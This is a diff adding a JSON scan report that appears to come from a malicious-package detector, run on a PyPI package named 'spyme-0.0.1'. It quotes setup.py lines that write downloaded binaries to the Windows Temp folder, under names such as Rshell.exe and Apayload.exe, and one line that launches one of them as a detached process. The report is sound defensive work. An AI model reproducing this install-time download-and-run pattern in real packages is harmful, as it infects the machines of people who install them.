@@ -1,0 +1,40 @@
+{
+    "issues": 4,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": [
+            {
+                "location": "setup.py:14",
+                "code": "    open(\"C:\\Windows\\Temp\\Alistener.exe\", \"wb\").write(r.content)\n",
+                "message": "This package is downloading making executable a remote binary"
+            },
+            {
+                "location": "setup.py:16",
+                "code": "    open(\"C:\\Windows\\Temp\\Apayload.exe\", \"wb\").write(r.content)\n",
+                "message": "This package is downloading making executable a remote binary"
+            },
+            {
+                "location": "setup.py:18",
+                "code": "    open(\"C:\\Windows\\Temp\\Rshell.exe\", \"wb\").write(r.content)\n",
+                "message": "This package is downloading making executable a remote binary"
+            }
+        ],
+        "shady-links": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": [
+            {
+                "location": "setup.py:22",
+                "code": "    subprocess.Popen(\"C:\\Windows\\Temp\\Alistener.exe\", creationflags=8, close_fds=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/spyme-0.0.1"
+}
